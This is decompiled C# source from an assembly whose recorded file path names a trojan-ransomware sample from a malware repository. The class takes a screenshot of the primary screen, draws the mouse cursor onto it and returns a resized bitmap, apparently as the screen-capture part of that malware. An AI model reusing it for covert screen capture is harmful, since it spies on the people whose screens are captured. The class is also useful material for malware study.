// Decompiled with JetBrains decompiler
// Type: hdrmiprcav.SCILRNS
// Assembly: hdrmiprcav, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C754D0F-39B8-40A7-A514-89B265F4A610
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4dfe62c4d3401b386b693509bcccfc0b91c72bc8365fdc68df9f7c050e35409c.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace hdrmiprcav
{
  internal class SCILRNS
  {
    private const int cursor_showing = 1;

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    public Bitmap desk_scren(int mg_height)
    {
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width1 = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height1 = bounds.Height;
      Bitmap original = new Bitmap(width1, height1, PixelFormat.Format24bppRgb);
      try
      {
        using (Graphics graphics = Graphics.FromImage((Image) original))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          SCILRNS.CURSORINFO pci;
          pci.cb_size = Marshal.SizeOf(typeof (SCILRNS.CURSORINFO));
          if (SCILRNS.GetCursorInfo(out pci))
          {
            if (pci.flags == 1)
            {
              SCILRNS.DrawIcon(graphics.GetHdc(), pci.prt_scren_pos.x, pci.prt_scren_pos.y, pci.h_cursor);
              graphics.ReleaseHdc();
            }
          }
        }
      }
      catch
      {
        return (Bitmap) null;
      }
      int height2 = original.Height * (mg_height * 100 / original.Height) / 100;
      int width2 = mg_height + mg_height * 100 / original.Width * mg_height / 100 + 100;
      return new Bitmap((Image) original, new Size(width2, height2));
    }

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out SCILRNS.CURSORINFO pci);

    private struct CURSORINFO
    {
      public int cb_size;
      public int flags;
      public IntPtr h_cursor;
      public SCILRNS.POINTAPI prt_scren_pos;
    }

    private struct POINTAPI
    {
      public int x;
      public int y;
    }
  }
}
